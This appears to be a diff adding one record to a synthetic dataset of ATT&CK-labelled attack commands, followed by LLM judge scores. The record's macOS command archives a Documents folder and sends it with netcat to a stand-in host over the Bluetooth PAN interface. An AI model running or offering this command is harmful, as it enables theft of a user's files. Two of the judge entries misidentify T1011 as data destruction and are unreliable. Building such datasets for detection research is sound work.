@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "tar czf - ~/Documents/Reports | nc -s \"$(networksetup -getinfo 'Bluetooth PAN' | awk -F': ' '/IP address/{print $2}')\" 203.0.113.50 55812",
+  "explanation": "Exfiltrates a compressed archive over the Bluetooth PAN interface by binding netcat to that service's IP, aligning with T1011 (use of an alternate network medium).",
+  "rationale_steps": [
+    "Query Bluetooth PAN IP via networksetup",
+    "Bind netcat to the Bluetooth PAN address (distinct medium)",
+    "Stream compressed data to a high, uncommon TCP port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-641961f7-e814cd6b",
+  "source_prompt_hash": "641961f7",
+  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper pipe syntax, balanced quotes, valid flags for both tar and nc, and correct use of command substitution with proper quoting.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does exfiltrate data over a network connection, it aligns with T1048 (Exfiltration Over Alternative Protocol) rather than T1011 (Data Destruction), as it's transferring rather than destroying data.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T01:31:33.602761Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags, correct command substitutions, and proper piping for all included utilities on macOS.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data exfiltration, creating and sending a compressed archive, which is semantically misaligned with the claimed MITRE ATT&CK technique T1011 (Data Destruction).",
+        "combined_score": 3.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-02T01:31:44.899587Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The pipeline is well-formed with balanced quoting and valid options for tar, nc, networksetup, and awk, and correct command substitution.",
+        "semantic_score": 4,
+        "semantic_justification": "It exfiltrates a gzipped tar of ~/Documents/Reports via netcat and attempts to source-bind to the Bluetooth PAN IP (consistent with exfiltration over an alternate medium), though actual use of that interface depends on routing and PAN availability.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T01:32:32.605687Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
